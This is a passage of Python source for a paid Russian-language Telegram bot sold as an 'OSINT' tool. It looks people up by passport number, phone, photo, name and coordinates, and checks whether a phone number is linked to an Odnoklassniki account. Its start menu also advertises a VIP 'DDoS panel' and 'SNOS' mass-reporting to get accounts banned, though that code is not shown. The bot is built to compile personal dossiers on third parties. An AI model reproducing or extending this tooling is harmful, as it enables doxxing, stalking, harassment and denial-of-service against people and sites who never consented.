            sections.insert(0, {"heading": "✈️ Telegram база", "items": items})
        elif src == "god_eye_by_phone":
            sections.append({"heading": "🔗 Связанный аккаунт (God_eye по телефону)", "items": [
                ("Username", f"@{rec.get('username','')}" if rec.get("username") else "—"),
                ("Имя", f"{rec.get('first_name','')} {rec.get('last_name','')}".strip()),
            ]})
        elif src == "telegram_by_phone":
            sections.append({"heading": "🔗 Связанный аккаунт (Telegram по телефону)", "items": [
                ("Username", f"@{rec.get('username','')}" if rec.get("username") else "—"),
                ("Имя", rec.get("name", "—")),
            ]})
    sections.append({"heading": "Сервисы для проверки", "items": [
        (name, f"https://t.me/{bu}") for name, bu, _ in services]})
    sections.append({"heading": "Что можно узнать легально", "lines": [
        "Telegram ID", "Дата регистрации (приблизительно)",
        "История username", "Публичные группы",
        "Флаги: scam/fake/premium/verified", "Био и аватар",
    ]})
    report = {"type": "telegram", "title": f"OSINT-анализ Telegram @{username}", "sections": sections}
    return text, report


# ================== КООРДИНАТЫ ==================
def lookup_coords(coords_input, chat_id=None):
    raw = coords_input.strip().replace(" ", "")
    if "," not in raw:
        return "❌ Формат: <code>55.7558,37.6173</code>", None
    parts = raw.split(",")
    if len(parts) != 2:
        return "❌ Нужно ровно две координаты: широта,долгота", None
    try:
        lat = float(parts[0]); lon = float(parts[1])
    except ValueError:
        return "❌ Координаты должны быть числами.", None
    if not (-90 <= lat <= 90) or not (-180 <= lon <= 180):
        return "❌ Широта: -90..90, долгота: -180..180.", None
    address, display_name = get_address_by_coordinates(lat, lon)
    text = (f"📍 <b>Обратное геокодирование</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"<b>Координаты:</b> <code>{lat}, {lon}</code>\n"
            f"<b>Ссылка:</b> <a href='https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=17/{lat}/{lon}'>OpenStreetMap</a>\n")
    if not address:
        text += f"\n⚠️ {display_name}"
        if chat_id:
            try:
                send_building_photo(chat_id, lat, lon, caption=f"📸 Примерный вид для {lat}, {lon}")
            except Exception as e:
                log(f"[BuildingPhoto coords] error: {e}")
        return text, {"type": "coords", "title": f"Координаты {lat}, {lon}",
                      "sections": [{"heading": "Результат", "notes": [display_name]}]}
    translated = translate_address(address)
    text += "━━━━━━━━━━━━━━━━━━\n"
    for k, v in translated.items(): text += f"<b>{k}:</b> {v}\n"
    if display_name: text += f"━━━━━━━━━━━━━━━━━━\n<i>{display_name}</i>"
    if chat_id:
        try:
            send_building_photo(chat_id, lat, lon, caption=f"📸 Примерный вид для {lat}, {lon}")
        except Exception as e:
            log(f"[BuildingPhoto coords] error: {e}")
    report = {"type": "coords", "title": f"Адрес по координатам {lat}, {lon}", "sections": [
        {"heading": "Координаты", "items": [("Широта", str(lat)), ("Долгота", str(lon))]},
        {"heading": "Адрес", "items": list(translated.items())}]}
    return text, report


# ================== ПАСПОРТ ==================
def search_passport(passport_number):
    if not re.match(r'^\d{10}$', passport_number):
        return "❌ Номер паспорта должен содержать 10 цифр", None
    s1, s2, num = passport_number[:2], passport_number[2:4], passport_number[4:]
    url = f"https://pasport.yapl.ru/{s1}/{s2}/{num}/"
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        response.encoding = 'utf-8'
        soup = BeautifulSoup(response.text, 'html.parser')
        cleaned = re.sub(r'\s+', ' ', soup.get_text()).strip()
        if "не найден" in cleaned.lower() or "404" in cleaned.lower():
            return "❌ Паспорт не найден в базе данных", None
        pattern = r'Паспорт серии\s+(\d{2})\s+(\d{2})\s+с номером\s+(\d{6}).*?выдан в субъекте РФ\s*-\s*(.*?)\s+в\s+(\d{4})'
        match = re.search(pattern, cleaned, re.IGNORECASE)
        if not match:
            return "❌ Информация о паспорте не найдена", None
        series1, series2, num, region, year = match.groups()
        mvd = "Не найдено"
        m = re.search(r'МВД ГУВД УВД\s*([\d\-]+)', cleaned)
        if m: mvd = m.group(1).strip()
        ovd = "Не найдено"
        m = re.search(r'ОВД\s*([\d\-\s]+)', cleaned)
        if m: ovd = re.sub(r'\s+', ' ', m.group(1).strip()).replace('- ', '-').strip()
        police = "Не найдено"
        m = re.search(r'отделения полиции\s*([\d\-\s]+)', cleaned, re.IGNORECASE)
        if m: police = re.sub(r'\s+', ' ', m.group(1).strip()).replace('- ', '-').strip()
        text = (f"🆔 <b>Поиск по паспорту</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"<b>Серия и номер:</b> {series1} {series2} {num}\n"
                f"<b>Полный номер:</b> <code>{passport_number}</code>\n"
                f"<b>Регион выдачи:</b> {region}\n"
                f"<b>Год выдачи:</b> {year}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"<b>МВД/ГУВД/УВД:</b> {mvd}\n"
                f"<b>ОВД:</b> {ovd}\n"
                f"<b>Отделения полиции:</b> {police}\n")
        report = {"type": "passport", "title": f"Паспорт {passport_number}", "sections": [
            {"heading": "Паспорт", "items": [
                ("Серия", f"{series1} {series2}"), ("Номер", num),
                ("Полный номер", passport_number),
                ("Регион выдачи", region), ("Год выдачи", year)]},
            {"heading": "Коды подразделений", "items": [
                ("МВД/ГУВД/УВД", mvd), ("ОВД", ovd),
                ("Отделения полиции", police)]},
        ]}
        return text, report
    except Exception as e:
        return f"❌ Ошибка при получении данных: {str(e)[:80]}", None


# ================== ОК ==================
def lookup_ok_phone(phone_input, region="RU"):
    try:
        parsed = phonenumbers.parse(phone_input, region)
    except phonenumbers.NumberParseException:
        return "❌ Не удалось распознать номер.", None
    if not phonenumbers.is_valid_number(parsed):
        return "❌ Номер невалиден.", None
    e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
    formatted = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    info = check_ok_login(e164.replace("+", ""))
    if info:
        text = (f"👥 <b>Одноклассники — аккаунт найден</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"<b>Номер:</b> {formatted}\n")
        for k, v in info.items():
            text += f"<b>{k}:</b> {v}\n"
        report = {"type": "ok", "title": f"Одноклассники по номеру {formatted}", "sections": [
            {"heading": "Номер", "items": [("Номер", formatted), ("E.164", e164)]},
            {"heading": "Аккаунт OK", "items": list(info.items())}]}
        return text, report
    else:
        text = (f"👥 <b>Одноклассники</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"<b>Номер:</b> {formatted}\n\n"
                f"❌ Номер не привязан к аккаунту OK (или проверка не удалась).")
        report = {"type": "ok", "title": f"Одноклассники по номеру {formatted}", "sections": [
            {"heading": "Номер", "items": [("Номер", formatted), ("E.164", e164)]},
            {"heading": "Результат", "notes": ["Номер не привязан к OK или проверка не удалась."]}]}
        return text, report


# ================== ФОТО ==================
def _extract_domain(url):
    try:
        return urlparse(url).netloc.lower()
    except Exception:
        return ""


def _human_size(num_bytes):
    for unit in ("Б", "КБ", "МБ", "ГБ"):
        if num_bytes < 1024:
            return f"{num_bytes:.1f} {unit}"
        num_bytes /= 1024
    return f"{num_bytes:.1f} ТБ"


def search_google_lens_serpapi(image_bytes, filename="image.jpg"):
    if not SERPAPI_KEY:
        return None
    try:
        files = {"encoded_image": (filename, io.BytesIO(image_bytes), "image/jpeg")}
        r = requests.post("https://serpapi.com/search",
                          data={"engine": "google_lens", "api_key": SERPAPI_KEY},
                          files=files, timeout=60)
        if r.status_code != 200:
            return None
        return r.json()
    except Exception as e:
        log(f"[Lens/SerpApi] ошибка: {e}")
        return None


def search_google_lens(image_bytes, filename="image.jpg"):
    try:
        headers = {"User-Agent": random.choice(OK_USERAGENTS),
                   "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8"}
        files = {"encoded_image": (filename, io.BytesIO(image_bytes), "image/jpeg")}
        r = requests.post(GOOGLE_LENS_UPLOAD, headers=headers, files=files,
                          data={"image_content": ""}, timeout=45, allow_redirects=True)
        if r.status_code not in (200, 302):
            return None
        final_url = r.url
        soup = BeautifulSoup(r.text, "html.parser")
        found_urls = []
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith("http") and "google." not in href and "gstatic." not in href:
                if href not in found_urls:
                    found_urls.append(href)
        snippets = []
        for tag in soup.find_all(["div", "span", "a"]):
            t = tag.get_text(strip=True)
            if t and 8 < len(t) < 200:
                if t not in snippets:
                    snippets.append(t)
            if len(snippets) >= 25:
                break
        return {"lens_url": final_url, "urls": found_urls[:20], "snippets": snippets[:20]}
    except Exception as e:
        log(f"[Lens] ошибка: {e}")
        return None


def search_yandex_images(image_bytes, filename="image.jpg"):
    try:
        headers = {"User-Agent": random.choice(OK_USERAGENTS),
                   "Accept-Language": "ru-RU,ru;q=0.9"}
        files = {"upfile": (filename, io.BytesIO(image_bytes), "image/jpeg")}
        params = {"rpt": "imageview", "format": "json",
                  "request": '{"blocks":[{"block":"b-page_type_search-by-image__link"}]}'}
        r = requests.post("https://yandex.ru/images-apphost/image-download",
                          params=params, headers=headers, files=files, timeout=45)
        if r.status_code != 200:
            return None
        try:
            data = r.json()
        except Exception:
            return None
        cbir_id = data.get("cbir_id") or data.get("url")
        if not cbir_id:
            return None
        return {"yandex_url": f"https://yandex.ru/images/search?rpt=imageview&cbir_id={cbir_id}",
                "cbir_id": cbir_id}
    except Exception as e:
        log(f"[Yandex] ошибка: {e}")
        return None


def _download_telegram_photo(file_id):
    file_info = bot.get_file(file_id)
    file_bytes = bot.download_file(file_info.file_path)
    filename = os.path.basename(file_info.file_path) or "photo.jpg"
    if "." not in filename:
        filename += ".jpg"
    return file_bytes, filename


def lookup_photo(image_bytes, filename="photo.jpg"):
    size = len(image_bytes)
    if size > MAX_PHOTO_SIZE:
        return f"❌ Фото слишком большое ({_human_size(size)}). Максимум — 15 МБ.", None
    text = "🖼️ <b>Поиск по фото</b>\n━━━━━━━━━━━━━━━━━━\n"
    sections = []
    serp_result = search_google_lens_serpapi(image_bytes, filename)
    if serp_result:
        text += "✅ <b>Google Lens (SerpApi):</b>\n"
        visual = serp_result.get("visual_matches", []) or []
        text_results = serp_result.get("text_results", []) or []
        if visual:
            text += f"  Найдено визуальных совпадений: <b>{len(visual)}</b>\n"
            lines = []
            for m in visual[:10]:
                title = m.get("title", "—")
                link = m.get("link", "")
                source = m.get("source", "")
                lines.append(f"{title} — {source}\n{link}")
                text += f"  • <a href='{link}'>{title}</a> — {source}\n"
            sections.append({"heading": "Google Lens: визуальные совпадения", "lines": lines})
        if text_results:
            text += f"  Текстовых совпадений: <b>{len(text_results)}</b>\n"
            lines = [f"{t.get('title','—')} — {t.get('link','')}" for t in text_results[:10]]
            sections.append({"heading": "Google Lens: текстовые совпадения", "lines": lines})
    if not serp_result:
        lens = search_google_lens(image_bytes, filename)
        if lens:
            text += "✅ <b>Google Lens:</b>\n"
            text += f"  🔗 <a href='{lens['lens_url']}'>Открыть полный результат в Lens</a>\n"
            if lens["urls"]:
                text += f"  Найдено сайтов: <b>{len(lens['urls'])}</b>\n"
                lines = []
                for u in lens["urls"][:15]:
                    dom = _extract_domain(u) or u
                    text += f"  • <a href='{u}'>{dom}</a>\n"
                    lines.append(f"{dom} — {u}")
                sections.append({"heading": "Google Lens: найденные сайты", "lines": lines})
            if lens["snippets"]:
                sections.append({"heading": "Google Lens: текстовые совпадения",
                                 "lines": lens["snippets"][:15]})
        else:
            text += "⚠️ Google Lens не вернул результат (возможна капча/блокировка).\n"
    yandex = search_yandex_images(image_bytes, filename)
    if yandex:
        text += "━━━━━━━━━━━━━━━━━━\n✅ <b>Яндекс.Картинки:</b>\n"
        text += f"  🔗 <a href='{yandex['yandex_url']}'>Открыть результат поиска</a>\n"
        sections.append({"heading": "Яндекс.Картинки",
                         "items": [("Ссылка на результат", yandex["yandex_url"])]})
    else:
        text += "━━━━━━━━━━━━━━━━━━\n⚠️ Яндекс.Картинки: не удалось получить результат.\n"
    try:
        img = Image.open(io.BytesIO(image_bytes))
        meta_items = [
            ("Размер файла", _human_size(size)),
            ("Разрешение", f"{img.width}x{img.height}"),
            ("Формат", img.format or "—"),
            ("Режим", img.mode),
        ]
        text += "━━━━━━━━━━━━━━━━━━\n📷 <b>Метаданные:</b>\n"
        for k, v in meta_items:
            text += f"  <b>{k}:</b> {v}\n"
        sections.insert(0, {"heading": "Метаданные изображения", "items": meta_items})
        exif = img.getexif()
        if exif:
            exif_items = []
            for tag_id, value in exif.items():
                tag_name = Image.ExifTags.TAGS.get(tag_id, str(tag_id))
                if isinstance(value, bytes):
                    continue
                exif_items.append((tag_name, str(value)))
            if exif_items:
                sections.append({"heading": "EXIF", "items": exif_items[:30]})
                text += "  <b>EXIF:</b> найден\n"
    except Exception as e:
        log(f"[Photo] EXIF error: {e}")
    text += ("━━━━━━━━━━━━━━━━━━\n"
             "🔎 <b>Ручные сервисы:</b>\n"
             "  • <a href='https://lens.google.com/'>Google Lens</a>\n"
             "  • <a href='https://yandex.ru/images/'>Яндекс.Картинки</a>\n"
             "  • <a href='https://tineye.com/'>TinEye</a>\n"
             "  • <a href='https://saucenao.com/'>SauceNAO</a> (аниме)\n"
             "  • <a href='https://trace.moe/'>trace.moe</a> (поиск аниме-кадра)")
    report = {"type": "photo", "title": f"Отчёт по фото {filename}",
              "sections": sections or [{"heading": "Результат", "notes": ["Ничего не найдено."]}]}
    return text, report


# ================== ОБРАБОТЧИКИ ФОТО ==================
@bot.message_handler(content_types=["photo"])
def handle_photo(message):
    ok, _ = check_access_or_free(message)
    if not ok:
        return
    photo = message.photo[-1]
    register_user(message.from_user, "поиск по фото")
    bot.send_chat_action(message.chat.id, "upload_photo")
    status_msg = bot.reply_to(message, "🔎 Анализирую фото, подождите...")
    try:
        image_bytes, filename = _download_telegram_photo(photo.file_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Не удалось скачать фото: {str(e)[:100]}",
                              message.chat.id, status_msg.message_id)
        return
    try:
        text, report = lookup_photo(image_bytes, filename)
    except Exception as e:
        bot.edit_message_text(f"❌ Ошибка анализа: {str(e)[:150]}",
                              message.chat.id, status_msg.message_id)
        return
    if report:
        last_reports[message.chat.id] = report
    try:
        bot.delete_message(message.chat.id, status_msg.message_id)
    except Exception:
        pass
    if len(text) > 4000:
        text = text[:3900] + "\n\n<i>... сообщение обрезано, скачайте полный отчёт в PDF/XML</i>"
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(content_types=["document"])
def handle_document_photo(message):
    ok, _ = check_access_or_free(message)
    if not ok:
        return
    doc = message.document
    mime = (doc.mime_type or "").lower()
    if not mime.startswith("image/"):
        return
    register_user(message.from_user, "поиск по фото (файл)")
    bot.send_chat_action(message.chat.id, "upload_photo")
    status_msg = bot.reply_to(message, "🔎 Анализирую файл, подождите...")
    try:
        file_info = bot.get_file(doc.file_id)
        image_bytes = bot.download_file(file_info.file_path)
    except Exception as e:
        bot.edit_message_text(f"❌ Не удалось скачать файл: {str(e)[:100]}",
                              message.chat.id, status_msg.message_id)
        return
    filename = doc.file_name or "photo.jpg"
    try:
        text, report = lookup_photo(image_bytes, filename)
    except Exception as e:
        bot.edit_message_text(f"❌ Ошибка анализа: {str(e)[:150]}",
                              message.chat.id, status_msg.message_id)
        return
    if report:
        last_reports[message.chat.id] = report
    try:
        bot.delete_message(message.chat.id, status_msg.message_id)
    except Exception:
        pass
    if len(text) > 4000:
        text = text[:3900] + "\n\n<i>... сообщение обрезано, скачайте полный отчёт в PDF/XML</i>"
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


# ================== МОНИТОРИНГ ==================
def monitor_check_loop():
    while True:
        time.sleep(60)
        now = time.time()
        with monitor_lock:
            tasks = []
            for chat_id, sites in monitored_sites.items():
                for domain, info in sites.items():
                    if now - info["last_check"] >= info["interval"]:
                        tasks.append((chat_id, domain, info))
        changed = False
        for chat_id, domain, info in tasks:
            try:
                r = requests.get(f"https://{domain}", timeout=10, allow_redirects=True,
                                 headers={"User-Agent": "UptimeBot/1.0"})
                is_up = r.status_code < 500; status_code = r.status_code
            except Exception:
                is_up = False; status_code = "—"
            with monitor_lock:
                if chat_id not in monitored_sites or domain not in monitored_sites[chat_id]:
                    continue
                prev = monitored_sites[chat_id][domain]["status"]
                monitored_sites[chat_id][domain]["last_check"] = now
                if is_up:
                    monitored_sites[chat_id][domain]["fail_count"] = 0
                    if prev == "down":
                        monitored_sites[chat_id][domain]["status"] = "up"
                        changed = True
                        try:
                            bot.send_message(chat_id, f"✅ <b>{domain}</b> снова доступен (HTTP {status_code})",
                                             parse_mode="HTML")
                        except Exception:
                            pass
                else:
                    monitored_sites[chat_id][domain]["fail_count"] += 1
                    if prev == "up" and monitored_sites[chat_id][domain]["fail_count"] >= 2:
                        monitored_sites[chat_id][domain]["status"] = "down"
                        changed = True
                        try:
                            bot.send_message(chat_id, f"🔴 <b>{domain}</b> недоступен", parse_mode="HTML")
                        except Exception:
                            pass
        if changed:
            save_monitored()


def start_monitor():
    threading.Thread(target=monitor_check_loop, daemon=True).start()


def save_monitored():
    save_json(MONITORED_FILE, {str(k): v for k, v in monitored_sites.items()})


def send_report(chat_id, report, fmt):
    try:
        safe_name = re.sub(r"[^\w\-]", "_", report["title"])[:40]
        if fmt == "pdf":
            filepath = os.path.join(REPORT_DIR, f"{chat_id}_{safe_name}.pdf")
            generate_pdf(report, filepath)
            with open(filepath, "rb") as f:
                bot.send_document(chat_id, f, caption="📄 PDF-отчёт")
        else:
            filepath = os.path.join(REPORT_DIR, f"{chat_id}_{safe_name}.xml")
            generate_xml(report, filepath)
            with open(filepath, "rb") as f:
                bot.send_document(chat_id, f, caption="📋 XML-отчёт")
        os.remove(filepath)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка генерации: {str(e)[:100]}")


def broadcast_maintenance(text):
    sent_ok = 0
    sent_fail = 0
    for uid_str in list(known_users.keys()):
        try:
            bot.send_message(int(uid_str), text, parse_mode="HTML")
            sent_ok += 1
        except Exception:
            sent_fail += 1
        time.sleep(0.05)
    return sent_ok, sent_fail


def owner_broadcast(chat_id, text):
    sent_ok = 0
    sent_fail = 0
    total = len(known_users)
    status = bot.send_message(
        chat_id,
        f"📣 <b>Рассылка запущена</b>\nВсего: {total}\nПрогресс: 0/{total}",
        parse_mode="HTML",
    )
    last_edit = time.time()
    for i, uid_str in enumerate(list(known_users.keys()), 1):
        try:
            bot.send_message(int(uid_str), f"👑 <b>Сообщение от владельца:</b>\n\n{text}",
                             parse_mode="HTML", disable_web_page_preview=True)
            sent_ok += 1
        except Exception:
            sent_fail += 1
        time.sleep(0.05)
        if time.time() - last_edit >= 5 or i == total:
            try:
                bot.edit_message_text(
                    f"📣 <b>Рассылка</b>\nПрогресс: {i}/{total}\n"
                    f"✅ {sent_ok} | ❌ {sent_fail}",
                    chat_id, status.message_id, parse_mode="HTML",
                )
            except Exception:
                pass
            last_edit = time.time()
    bot.send_message(
        chat_id,
        f"✅ <b>Рассылка завершена</b>\n"
        f"Всего: {total} | ✅ {sent_ok} | ❌ {sent_fail}",
        parse_mode="HTML",
    )


# ================== КОМАНДЫ ==================
@bot.message_handler(commands=["start", "help"])
def cmd_start(message):
    if not check_access(message, require_vip=False): return
    register_user(message.from_user, "запуск бота /start")
    user_regions.setdefault(message.chat.id, "RU")
    vip_status = "✅ активен" if has_vip(message.from_user) else "❌ не активен"
    if has_vip(message.from_user) or is_admin(message.from_user):
        free_status = "— (у вас VIP)"
    elif has_free_lookup(message.from_user):
        free_status = "🎁 1 бесплатный пробив доступен"
    else:
        free_status = "❌ бесплатный пробив использован"
    text = ("👋 <b>OSINT-бот</b>\n\n"
            "• 📞 Поиск по номеру (200+ live-API и архивов + досье + HIBP)\n"
            "• 🆔 Apify People Search / TruePeopleSearch / Phone Enrichment\n"
            "• 📧 Поиск по Email (SMTP + MX + утечки + соцсети + домен + Apify)\n"
            "• 🌐 Поиск по IP (обычный и расширенный) + 📸 фото здания\n"
            "• 👤 Ссылки по ФИО (+ Telegram база + Apify TPS)\n"
            "• 🌍 Информация о сайте\n"
            "• 🏠 Поиск кадастра по адресу\n"
            "• 📍 Обратное геокодирование координат + 📸 фото здания\n"
            "• 📱 Telegram OSINT (с привязанным номером)\n"
            "• 🆔 Поиск по Telegram ID (/tgid)\n"
            "• 🆔 Поиск по паспорту\n"
            "• 👥 Проверка привязки номера к Одноклассникам\n"
            "• 🖼️ Поиск по фото (Google Lens + Яндекс)\n"
            "• 🕵️ Поиск по никнейму (Sherlock, 400+ сайтов)\n"
            "• 🔗 VK по ссылке (публичные контакты)\n"
            "• 🗄️ Поиск по локальным базам данных\n"
            "• 📘 Facebook Email базы\n"
            "• 📦 Универсальные базы\n"
            "• 💣 DDoS-панель (VIP)\n"
            "• 📨 SNOS WEB (прямые запросы, 1000 за запуск)\n"
            "• 📧 SNOS через почты\n"
            "• 📡 Uptime-мониторинг (бесплатно)\n"
            "• 📥 Экспорт в PDF/XML\n\n"
            f"💎 <b>Ваш VIP:</b> {vip_status}\n"
            f"🎁 <b>Бесплатный пробив:</b> {free_status}\n\n"
            "Выберите действие:")
    bot.send_message(message.chat.id, text, parse_mode="HTML",
                     reply_markup=main_menu(message.from_user))


@bot.message_handler(commands=["about"])
def cmd_about(message):
    if not check_access(message, require_vip=False): return
    register_user(message.from_user, "открыл «О нас»")
    bot.send_message(message.chat.id, ABOUT_TEXT, parse_mode="HTML", reply_markup=back_menu())


@bot.message_handler(commands=["vip"])
def cmd_vip(message):
    if not check_access(message, require_vip=False): return
    register_user(message.from_user, "открыл VIP-раздел")
    status = "активен" if has_vip(message.from_user) else "не активен"
    text = (f"💎 <b>VIP-доступ</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"<b>Статус:</b> {status}\n"
            f"<b>Действует до:</b> {vip_until_text(message.from_user)}\n\n"
            f"VIP открывает все функции бота.\n"
            f"Оплата: 💳 рубли (ЮMoney), 🪙 NFT (@lonazov) или 💎 крипта (TON).\n"
            f"В любом случае обязателен скриншот подтверждения.\n\nВыберите действие:")
    bot.send_message(message.chat.id, text, parse_mode="HTML",
                     reply_markup=vip_menu(message.from_user))


@bot.message_handler(commands=["admin"])
def cmd_admin(message):
    if not is_admin(message.from_user): return
    register_user(message.from_user)
    bot.send_message(message.chat.id, "🛡️ <b>Админ-панель</b>\n\nВыберите действие:",
                     parse_mode="HTML", reply_markup=admin_menu())


@bot.message_handler(commands=["users"])
def cmd_users(message):
    if not is_admin(message.from_user): return
    if not known_users:
        bot.reply_to(message, "👥 Пользователей пока нет."); return
    lines = [f"👥 <b>Пользователи ({len(known_users)}):</b>\n"]
    for uid, info in sorted(known_users.items(),
                            key=lambda x: x[1].get("last_seen", ""),
                            reverse=True)[:30]:
        emoji = "🚫" if int(uid) in blocked_users else "✅"
        free_mark = "🎁" if not info.get("free_lookup_used", False) else "—"
        lines.append(f"{emoji}{free_mark} <b>ID:</b> <code>{uid}</code>\n"
                     f"   <b>@{info.get('username', '—')}</b> — {info.get('first_name', '')}\n"
                     f"   Действий: {info.get('actions', 0)} | Последний: {info.get('last_seen', '—')}")
    bot.reply_to(message, "\n\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["maintenance"])
def cmd_maintenance(message):
    if not is_admin(message.from_user): return
    status = "⏸️ ВКЛЮЧЁН" if is_maintenance() else "▶️ ВЫКЛЮЧЕН"
    kb = types.InlineKeyboardMarkup(row_width=1)
    if is_maintenance():
        kb.add(types.InlineKeyboardButton("🟦 ▶️ Возобновить работу", callback_data="maintenance_off"))
    else:
        kb.add(types.InlineKeyboardButton("🟦 ⏸️ Включить техперерыв", callback_data="maintenance_on"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    bot.send_message(message.chat.id, f"🛠️ <b>Технический перерыв:</b> {status}",
                     parse_mode="HTML", reply_markup=kb)


@bot.message_handler(commands=["name"])
def cmd_name(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /name Иван Иванов"); return
    register_user(message.from_user, f"поиск по ФИО: {parts[1].strip()}")
    text, report = lookup_name(parts[1].strip())
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["phone"])
def cmd_phone(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /phone +79161234567"); return
    register_user(message.from_user, f"поиск по номеру: {parts[1].strip()}")
    region = user_regions.get(message.chat.id, "RU")
    bot.send_chat_action(message.chat.id, "typing")
    text, report = lookup_phone(parts[1].strip(), region)
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML",
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["email"])
def cmd_email(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /email test@example.com"); return
    register_user(message.from_user, f"поиск по email: {parts[1].strip()}")
    bot.send_chat_action(message.chat.id, "typing")
    text, report = lookup_email(parts[1].strip())
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["ip"])
def cmd_ip(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /ip 8.8.8.8"); return
    register_user(message.from_user, f"поиск по IP: {parts[1].strip()}")
    bot.send_chat_action(message.chat.id, "typing")
    text, report = lookup_ip(parts[1].strip(), chat_id=message.chat.id)
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["ipx"])
def cmd_ipx(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /ipx 8.8.8.8"); return
    register_user(message.from_user, f"расширенный IP-поиск: {parts[1].strip()}")
    bot.send_chat_action(message.chat.id, "typing")
    text, report = lookup_ip_extended(parts[1].strip(), chat_id=message.chat.id)
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["tps"])
def cmd_tps(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /tps телефон_или_имя_или_email"); return
    query = parts[1].strip()
    register_user(message.from_user, f"TPS поиск: {query}")
    bot.send_chat_action(message.chat.id, "typing")
    is_phone = bool(re.match(r"^[\+\d\s\-\(\)]{10,}$", query))
    is_email = "@" in query and "." in query.split("@")[-1]
    if is_email:
        try:
            from apify_client import ApifyClient
            client = ApifyClient(APIFY_TOKEN)
            run_input = {"searchMode": "email", "email": query, "maxItems": 3, "detailed": True}
            run = client.actor(TRUEPEOPLESEARCH_APIFY_ACTOR).call(run_input=run_input)
            items = list(client.dataset(run.default_dataset_id).iterate_items())
            result = items[0] if items else {}
        except Exception:
            result = {}
    else:
        result = check_apify_truepeoplesearch(query, is_phone=is_phone)
    if not result:
        bot.reply_to(message, "❌ TruePeopleSearch ничего не нашёл (US-only)."); return
    text = f"🇺🇸 <b>TruePeopleSearch (Apify)</b>\n━━━━━━━━━━━━━━━━━━\n"
    for k, v in result.items():
        if isinstance(v, list):
            text += f"<b>{k}:</b>\n" + "\n".join(f"  • {x}" for x in v[:5]) + "\n"
        elif v:
            text += f"<b>{k}:</b> {v}\n"
    bot.reply_to(message, text, parse_mode="HTML")


@bot.message_handler(commands=["passport"])
def cmd_passport(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /passport 1234567890 (10 цифр)"); return
    register_user(message.from_user, f"поиск по паспорту: {parts[1].strip()}")
    bot.send_chat_action(message.chat.id, "typing")
    text, report = search_passport(parts[1].strip())
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["ok"])
def cmd_ok(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /ok +79161234567"); return
    register_user(message.from_user, f"проверка OK по номеру: {parts[1].strip()}")
    bot.send_chat_action(message.chat.id, "typing")
    region = user_regions.get(message.chat.id, "RU")
    text, report = lookup_ok_phone(parts[1].strip(), region)
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["site"])
def cmd_site(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используйте: /site example.com"); return
    register_user(message.from_user, f"поиск по сайту: {parts[1].strip()}")
    bot.send_chat_action(message.chat.id, "typing")
    text, report = lookup_site(parts[1].strip())
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["kadastr"])
